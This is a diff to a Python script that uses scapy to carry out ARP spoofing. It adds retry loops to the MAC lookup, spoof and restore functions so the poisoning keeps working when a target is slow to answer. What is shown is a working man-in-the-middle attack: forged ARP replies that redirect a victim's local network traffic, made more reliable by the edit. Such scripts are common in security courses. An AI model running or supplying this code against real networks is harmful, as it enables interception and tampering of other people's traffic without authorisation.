@@ -23,22 +23,31 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=4)[0]
-
-    return answered_list[0][1].hwsrc
+    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=2)[0]
+    try:
+        return answered_list[0][1].hwsrc
+    except: return -1
 
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    while target_mac == -1:
+        target_mac = get_mac(target_ip)
+
+    if target_mac != -1:
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False, count=4)
+    while destination_mac == -1 or source_mac == -1:
+        destination_mac = get_mac(destination_ip)
+        source_mac = get_mac(source_ip)
+    if destination_mac != -1 and source_mac != -1:
+        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+        scapy.send(packet, verbose=False, count=4)
 
 
 options = get_arguments()
